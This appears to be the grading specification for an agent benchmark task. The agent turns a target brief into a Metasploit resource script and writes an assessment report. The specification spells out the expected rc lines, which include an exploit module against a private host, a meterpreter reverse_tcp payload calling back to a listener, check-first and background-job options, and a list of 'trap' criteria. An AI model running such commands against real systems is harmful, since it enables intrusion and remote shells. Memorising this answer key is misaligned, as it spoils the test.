description:
1. Agent reads target_brief.txt and extracts: module=exploit/linux/http/fintrack_upload_rce, rhosts=10.14.22.7, rport=8443, payload must be linux/x64/meterpreter/reverse_tcp (arch-correct for linux x86_64 HTTP target per module-selection.md), lhost=10.14.22.1, lport=5555, TARGETURI=/portal/upload.
2. Agent invokes `python3 scripts/build_rc.py` with ALL of: --module, --rhosts, --rport, --payload (linux/x64/meterpreter/reverse_tcp), --lhost, --lport, --set TARGETURI=/portal/upload, --check (check-first workflow), --job (background execution per brief), --output engagements/q2_audit/q2_fintrack_assessment.rc.
3. The generated .rc file must contain: `use exploit/linux/http/fintrack_upload_rce`, `set RHOSTS 10.14.22.7`, `set RPORT 8443`, `set PAYLOAD linux/x64/meterpreter/reverse_tcp`, `set LHOST 10.14.22.1`, `set LPORT 5555`, `set TARGETURI /portal/upload`, a bare `check` line BEFORE `exploit -j` (not plain `run`).
4. Agent writes engagements/q2_audit/reports/q2_fintrack_report.txt with all 5 required sections from workflow.md: Objective, Procedure, Result, Impact, Remediation — referencing the target host and module, and including the rc script name or build_rc.py invocation for reproducibility.
Proprietary traps: (a) must use --job flag to get `exploit -j` not plain `run`; (b) must use --check flag for check-first workflow; (c) must use --set TARGETURI=/portal/upload as bespoke HTTP option; (d) must use linux/x64 (not x86 or windows) payload from module-selection.md architecture rules; (e) must NOT reuse stale LHOST/LPORT from old scan configs; (f) report must have exactly the 5 sections named in workflow.md template.
